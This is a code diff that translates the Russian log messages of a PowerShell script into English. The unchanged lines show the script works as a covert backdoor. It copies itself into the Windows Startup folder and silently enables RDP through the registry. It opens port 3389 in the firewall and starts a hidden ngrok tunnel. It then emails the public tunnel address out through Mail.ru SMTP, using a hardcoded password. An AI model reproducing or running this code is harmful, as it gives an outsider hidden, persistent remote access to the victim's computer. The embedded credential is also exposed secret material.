@@ -5,34 +5,34 @@ $logFile = "$env:TEMP\ngrok_log.txt"
 function Log($msg) {
     "[$(Get-Date -Format s)] $msg" | Out-File -FilePath $logFile -Encoding UTF8 -Append
 }
-Log "=== Скрипт стартовал ==="
+Log "=== Script started ==="
 
 # === Путь текущего скрипта ===
 $thisScript = $MyInvocation.MyCommand.Path
-Log "Текущий скрипт: $thisScript"
+Log "Current script: $thisScript"
 
 # === Копирование в автозагрузку ===
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ngrok.ps1"
 if ($thisScript -ne $startupPath -and -not (Test-Path $startupPath)) {
     Copy-Item -Path $thisScript -Destination $startupPath -Force
-    Log "Скрипт скопирован в автозагрузку"
+    Log "The script has been copied to startup."
     exit
 }
 
 # === Включаем RDP ===
 try {
     Start-Process reg.exe -ArgumentList 'add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' -Verb RunAs -WindowStyle Hidden | Out-Null
-    Log "RDP включён"
+    Log "RDP enabled"
 } catch {
-    Log "Ошибка при включении RDP: $_"
+    Log "Error when enabling RDP: $_"
 }
 
 # === Открываем порт 3389 в Firewall ===
 try {
     Start-Process netsh -ArgumentList 'advfirewall firewall add rule name="ngrok RDP" dir=in action=allow protocol=TCP localport=3389' -WindowStyle Hidden | Out-Null
-    Log "Firewall правило добавлено"
+    Log "Firewall rule added"
 } catch {
-    Log "Ошибка при добавлении правила брандмауэра: $_"
+    Log "Error adding firewall rule: $_"
 }
 
 # === Скачивание и установка ngrok ===
@@ -44,12 +44,12 @@ if (-not (Test-Path $ngrokExe)) {
     try {
         Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile $tempZip
         Expand-Archive -Path $tempZip -DestinationPath $ngrokDir -Force
-        Log "Ngrok скачан и распакован"
+        Log "Ngrok downloaded and unpacked"
     } catch {
-        Log "Ошибка при загрузке ngrok: $_"
+        Log "Error while downloading ngrok: $_"
     }
 } else {
-    Log "Ngrok уже установлен"
+    Log "Ngrok is installed"
 }
 
 # === Создание конфигурации ngrok ===
@@ -72,9 +72,9 @@ tunnels:
 # === Запуск туннеля ===
 try {
     Start-Process -FilePath $ngrokExe -ArgumentList "start --config `"$ngrokConfig`" rdp" -WindowStyle Hidden
-    Log "Ngrok запущен"
+    Log "Ngrok launched"
 } catch {
-    Log "Ошибка при запуске ngrok: $_"
+    Log "Error while launching ngrok: $_"
 }
 
 # === Ожидание появления tunnelAddress ===
@@ -85,7 +85,7 @@ for ($i = 0; $i -lt 30; $i++) {
         $t = $resp.tunnels | Where-Object { $_.proto -eq "tcp" }
         if ($t -and $t.public_url) {
             $tunnelAddress = $t.public_url
-            Log "Получен tunnelAddress: $tunnelAddress"
+            Log "Recieved a tunnelAddress: $tunnelAddress"
             break
         }
     } catch {
@@ -93,7 +93,7 @@ for ($i = 0; $i -lt 30; $i++) {
     }
 }
 if (-not $tunnelAddress) {
-    Log "Не удалось получить tunnelAddress"
+    Log "Couldn't get tunnelAddress"
 }
 
 # === Отправка письма через Mail.ru ===
@@ -104,7 +104,7 @@ $smtpPass   = "DggLc7dSWENCbM56151O"
 
 $from = $smtpUser
 $to   = $smtpUser
-$subj = "Ngrok RDP адрес"
+$subj = "Ngrok RDP address"
 $body = if ($tunnelAddress) {
     "Ngrok public TCP address: $tunnelAddress"
 } else {
@@ -112,12 +112,12 @@ $body = if ($tunnelAddress) {
 }
 
 try {
-    Log "Попытка отправки email"
+    Log "Attempt to send email"
     $securePass = ConvertTo-SecureString $smtpPass -AsPlainText -Force
     $cred = New-Object System.Management.Automation.PSCredential($smtpUser, $securePass)
     Send-MailMessage -From $from -To $to -Subject $subj -Body $body `
         -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $cred -ErrorAction Stop
-    Log "Email успешно отправлен"
+    Log "Email successfully sent "
 } catch {
-    Log "Ошибка при отправке email: $($_)"
+    Log "Error while sending email: $($_)"
 }
